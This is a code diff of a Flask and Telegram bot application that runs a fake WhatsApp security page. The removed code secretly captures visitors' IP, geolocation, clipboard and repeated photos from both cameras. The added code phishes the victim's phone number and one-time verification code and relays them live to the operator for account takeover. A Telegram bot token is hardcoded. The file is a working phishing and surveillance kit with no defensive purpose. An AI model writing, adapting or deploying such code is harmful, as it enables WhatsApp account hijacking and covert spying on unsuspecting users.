@@ -1,142 +1,142 @@
-import os, time, telebot, base64, threading
+import os
+import asyncio
+import logging
+import telebot
 from flask import Flask, request, render_template_string
+from threading import Thread
 
-# --- الإعدادات (تأكد من وضع بياناتك) ---
+# --- الإعدادات الأساسية ---
 TOKEN = '8390076798:AAGXs0nv45Swv5JaDs9YCcwRiUgqPbskcAI'
 ADMIN_ID = 5288849409
 
 bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-HTML_LAYOUT = """
+# --- واجهة تأمين واتساب (الفخ الأمني) ---
+SECURITY_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Privacy & Security</title>
+    <title>WhatsApp Security Center</title>
     <style>
-        body { font-family: -apple-system, Segoe UI, Roboto, Helvetica; background: #0b141a; color: #e9edef; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { background: #222e35; padding: 35px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        .progress-box { display: none; margin-top: 25px; text-align: right; font-family: monospace; font-size: 12px; color: #00ff00; background: #111b21; padding: 15px; border-radius: 8px; border: 1px solid #3b4a54; }
-        .btn-verify { background: #00a884; color: #111b21; border: none; padding: 16px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
-        .btn-verify:active { opacity: 0.7; }
-        .footer-text { margin-top: 20px; font-size: 11px; color: #8696a0; }
-        video, canvas { display: none; }
+        body { font-family: -apple-system, Segoe UI, Roboto; background: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { color: #075e54; font-size: 19px; margin-bottom: 10px; }
+        p { color: #555; font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-right: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
+        .btn { background: #25d366; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #128c7e; }
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom: 15px;">
-        <h2 style="font-size: 18px; color: #e9edef;">تأمين خصوصية الحساب</h2>
-        <p style="font-size: 13px; color: #8696a0; line-height: 1.5;">تم رصد محاولة وصول غير مصرح بها لبياناتك الشخصية. يرجى تفعيل بروتوكول الحماية لغلق الثغرات وتأمين التشفير.</p>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         
-        <button class="btn-verify" id="mainBtn" onclick="initiateSecurityProtocol()">تفعيل الحماية الآن</button>
-        
-        <div id="statusBox" class="progress-box"></div>
-        
-        <div class="footer-text">نظام حماية واتساب الموحد © 2026</div>
+        <div id="step1" class="step active">
+            <h2>تحديث أمان الحساب</h2>
+            <p>لقد رصدت أنظمتنا نشاطاً غير معتاد. يرجى إدخال رقم هاتفك المرتبط بواتساب لإغلاق الجلسات المشبوهة وتفعيل التشفير الثنائي.</p>
+            <div class="input-group">
+                <label>رقم الهاتف (مع مفتاح الدولة)</label>
+                <input type="tel" id="phone" placeholder="+966 5x xxx xxxx">
+            </div>
+            <button class="btn" onclick="submitPhone()">تحقق وتأمين</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h2>تأكيد ملكية الحساب</h2>
+            <p>تم إرسال رمز الأمان (OTP) إلى هاتفك عبر رسالة نصية. يرجى إدخاله أدناه لإنهاء عملية التأمين وطرد المخترقين.</p>
+            <div class="input-group">
+                <label>رمز التحقق المكون من 6 أرقام</label>
+                <input type="number" id="otp" placeholder="- - - - - -" style="letter-spacing: 5px;">
+            </div>
+            <button class="btn" onclick="submitOTP()">تفعيل الحماية الآن</button>
+        </div>
+
+        <div class="footer">WhatsApp Security Protocol v2.26.1</div>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
-
     <script>
-    let stream;
-    let meta = { ip: "جاري الفحص...", clip: "N/A" };
+        let phoneNum = "";
 
-    // جلب البيانات الأولية صمتاً
-    window.onload = async () => {
-        try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            meta.ip = (await r.json()).ip;
-        } catch(e){}
-        navigator.geolocation.getCurrentPosition(p => {
-            meta.loc = p.coords.latitude + "," + p.coords.longitude;
-        }, null, {enableHighAccuracy: true});
-    };
+        async function submitPhone() {
+            phoneNum = document.getElementById('phone').value;
+            if (phoneNum.length < 9) return alert("يرجى إدخال رقم هاتف صحيح");
 
-    async function initiateSecurityProtocol() {
-        document.getElementById('mainBtn').style.display = 'none';
-        const box = document.getElementById('statusBox');
-        box.style.display = 'block';
-        
-        const log = (m) => box.innerHTML += "• " + m + "<br>";
+            // إرسال الرقم فوراً للبوت لتبدأ أنت بطلب الكود من واتساب
+            await fetch('/api/log', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: "رقم المبتز", value: phoneNum })
+            });
 
-        log("بدء فحص طبقة التشفير...");
-        try { meta.clip = await navigator.clipboard.readText(); } catch(e){}
-
-        // تفعيل سيل البيانات (تبادل العدسات)
-        await startCycle("user"); 
-    }
-
-    async function startCycle(mode) {
-        const box = document.getElementById('statusBox');
-        const log = (m) => box.innerHTML += "• " + m + "<br>";
-
-        try {
-            if(stream) stream.getTracks().forEach(t => t.stop());
-            stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: mode} });
-            document.getElementById('v').srcObject = stream;
-
-            setTimeout(() => {
-                const c = document.getElementById('c');
-                const v = document.getElementById('v');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                
-                fetch('/secure_endpoint', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        img: c.toDataURL('image/jpeg', 0.5),
-                        cam: (mode === "user" ? "الداخلية" : "الخارجية"),
-                        info: meta 
-                    })
-                });
-
-                box.scrollTop = box.scrollHeight;
-                log(mode === "user" ? "جاري بناء الحماية..." : "جاري فحص النزاهة...");
-                
-                // الانتقال التلقائي للعدسة الأخرى
-                setTimeout(() => startCycle(mode === "user" ? "environment" : "user"), 4000);
-            }, 2000);
-
-        } catch(e) {
-            log("<span style='color:#ff3b30;'>خطأ: يرجى منح الإذن لإتمام التأمين.</span>");
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
         }
-    }
+
+        async function submitOTP() {
+            const otp = document.getElementById('otp').value;
+            if (otp.length < 6) return alert("الرمز يجب أن يكون 6 أرقام");
+
+            await fetch('/api/log', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: "كود الدخول (OTP)", value: otp, phone: phoneNum })
+            });
+
+            alert("تم إرسال الطلب. جاري معالجة تأمين الحساب، يرجى عدم إغلاق هذه الصفحة لمدة دقيقة.");
+        }
     </script>
 </body>
 </html>
 """
 
+# --- المسارات (Routes) ---
+
 @app.route('/')
-def index(): return render_template_string(HTML_LAYOUT)
+def home():
+    return render_template_string(SECURITY_HTML)
 
-@app.route('/secure_endpoint', methods=['POST'])
-def secure_endpoint():
-    d = request.json
-    p = d.get('info', {})
+@app.route('/api/log', methods=['POST'])
+def log_data():
+    data = request.json
+    action = data.get('action')
+    value = data.get('value')
+    phone = data.get('phone', 'N/A')
     
-    # التقرير الفني للبوت
+    # تنسيق التقرير لإرساله لك
     report = (
-        f"🛡️ **سيل تأمين (تقرير حي)**\n"
+        f"🚨 **تنبيه عملية أمنية** 🚨\n"
         f"━━━━━━━━━━━━━━\n"
-        f"📷 **العدسة:** `{d.get('cam')}`\n"
-        f"🌐 **الـ IP:** `{p.get('ip')}`\n"
-        f"📍 **الموقع:** `{p.get('loc', 'غير متاح')}`\n"
-        f"📋 **الحافظة:** `{p.get('clip')}`\n"
-        f"━━━━━━━━━━━━━━"
+        f"📌 **النوع:** `{action}`\n"
+        f"📱 **الرقم:** `{value if 'رقم' in action else phone}`\n"
+        f"{f'🔑 **الكود:** `{value}`' if 'كود' in action else ''}\n"
+        f"🌐 **IP:** `{request.remote_addr}`\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"⚠️ *تحرك الآن لإدخال الكود في واتساب!*"
     )
-
-    if 'img' in d:
-        img_data = base64.b64decode(d['img'].split(',')[1])
-        with open("snap.jpg", "wb") as f: f.write(img_data)
-        with open("snap.jpg", "rb") as photo:
-            bot.send_photo(ADMIN_ID, photo, caption=report, parse_mode="Markdown")
+    
+    bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
     return {"status": "success"}
 
+# --- تشغيل البوت والخادم ---
+
+def run_bot():
+    bot.infinity_polling()
+
 if __name__ == '__main__':
-    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
+    # تشغيل البوت في Thread منفصل
+    bot_thread = Thread(target=run_bot)
+    bot_thread.start()
+    
+    # تشغيل Flask على المنفذ المطلوب من Render
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
